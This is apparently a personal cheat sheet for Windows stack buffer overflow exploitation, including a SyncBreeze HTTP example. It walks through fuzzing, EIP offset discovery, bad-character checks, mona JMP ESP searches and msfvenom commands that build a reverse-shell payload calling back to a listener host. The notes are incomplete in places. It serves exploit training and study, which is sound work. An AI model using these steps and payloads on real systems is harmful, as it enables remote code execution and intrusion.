# The Stack Buffer Overflow

https://en.wikipedia.org/wiki/Stack_buffer_overflow

## High-Level Steps

0. Find an input
1. Find out how long that input's buffer is by crashing the app
2. Find out where the Instruction Pointer is in a pattern (offset) (EIP)
3. Find out how long that buffer can go (after EIP)
4. Find out which characters won't work in the payload
5. Find a viable JMP ESP Instruction (that doesn't contain any bad Chars and has SafeSEH disabled)
6. TODO

## VARIABLES
```python
# Eric's Copy-Paste Python Stack BOF Methodology

crash_len = NA  # -----V------------V
crash_A = "A" * crash_len
### $ msf-pattern_create -l <crash_len+10%>                  * to isolate EIP
ptrn_ofst = "^-- result of that"
tmp_eip = "76413176" # goes into that ----------------v
### $ msf-pattern_offset -l <crash_len+10%> -q <EIP_Value>  * to identify offset
eipoffset = 634 # ^-- Result of that
### https://www.calculator.net/hex-calculator.html?number1= !end of CCCc addr! &c2op=-&number2= !start of CCCC addr! &calctype=op&x=48&y=22
C_surface

step = 0

msf-pattern_offset -l 770 -q 76413176

if(step == 1): # Payload #1  (fuzzer.py)
   payload = padding_A  # growing in intervals to crash app
if(step == 2): # Payload #2  (offset.py)
   payload = ptrn_ofst  # enough to get EIP
if(step == 3): # Payload #3  (crash.py)
   payload = "A" * eipoffset + "BBBB" + "CCCC" # double check (42424242)
if(step == 4): # Payload #4  (extend.py)
   payload = "A" * eipoffset + "BBBB" + "C" * ( crash_len * 3 )
if(step == 5): # Payload #5  ()

```



## File, Command & Step Sequence

0. `~$ python fuzzer.py` "AAAAAAA..." --> var: buffer
1.  `~$ msf-pattern_create -l <fuzz_result+10%>`
2.  `~$ python offset.py` "AaBcCcDd..."
3.  _Get EIP Register Value From Debugger_
4.  `~$ msf-pattern_offset -l <fuzz_result+10%> -q <EIP_Value>` --> var: offset
5.  `~$ python crash.py` "...AABBBCC..."
6.  `~$ python extend.py` "...AABBBCCXXXXXX..."
7.  _Use Start & End of XX Pattern For Range: https://www.calculator.net/hex-calculator.html_
8.  `~$ python bchars.py`
9.  `!mona modules` _(to find module with addr range not including bad chars)_
10. `!mona find -s "\xff\xe4" -m "libspp.dll"` _(find a JMP ESP instruction to use to point at our buffer)_
11. `~$ python jmptest.py` (with breakpoint)
12. `~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=1337 -f c –e x 86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
13. `~$ python shell.py` (with shellcode & nop sled.)
14. ???
15. Profit.

## HTTP-based Steps (SYNCBREEZE)

buffer = 800
offset = 780

0. Find POST Request
1. Fuzzing (http_fuzz.py)
   - Send a growing number of 'A's until the app crashes.
   - The length of that string is an estimate of the buffer length.
   - Use the range & step variables to hone down exact length
2. Identify EIP Using A Pattern. (http_offset.py)
   - Replace the 'A's with a sequence of bytes to identify EIP in the debugger.
3. Determine the offset of the EIP address in the string
4. Confirm offset using AAAABBBBCCCC pattern.
5. See How Long the CCC... Pattern Will Go after the minimum crash length.
6. Calculate byte range using calculator.net
7. Determine bad characters 
8. Find JMP ESP instruction in a dll module (without bad chars)  (0x10090c83)
9. Replace "HECK" with 0x10090c83 but reversed (on little endian) so "10 09 0c 83" --flipped--> "\x83\x0c\x09\x10"
10. Set breakpoint at 0x10090c83 (JMP) to confirm it points at the first of the ..XXX pattern
11. `~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=1337 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
12. 

## Common Bad Chars
00 for NULL
0A for Line Feed
0D for Carriage Return
FF for Form Feed


## Mona Commands
* Set mona working directory
`!mona config -set workingfolder c:\mona\%p`
* Find all JMP ESP instructions that don't include the bad characters
`!mona jmp -r esp -cpb "badcharssring (\x00 format)"`


```python
207
```

_full list of all chars in order_

```txt
# Raw Hex For Python:
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

Forward, Lowercase
000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff

Forward, Uppercase
000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5F606162636465666768696A6B6C6D6E6F707172737475767778797A7B7C7D7E7F808182838485868788898A8B8C8D8E8F909192939495969798999A9B9C9D9E9FA0A1A2A3A4A5A6A7A8A9AAABACADAEAFB0B1B2B3B4B5B6B7B8B9BABBBCBDBEBFC0C1C2C3C4C5C6C7C8C9CACBCCCDCECFD0D1D2D3D4D5D6D7D8D9DADBDCDDDEDFE0E1E2E3E4E5E6E7E8E9EAEBECEDEEEFF0F1F2F3F4F5F6F7F8F9FAFBFCFDFEFF

```


# Text Manipulation Tools
https://onlinetexttools.com/reverse-text
https://onlinetexttools.com/split-text
https://www.textfixer.com/tools/uppercase-lowercase-text.php

https://www.rapidtables.com/convert/number/hex-to-ascii.html

!! https://text-compare.com/
!! https://www.prepostseo.com/tool/reverse-text-generator

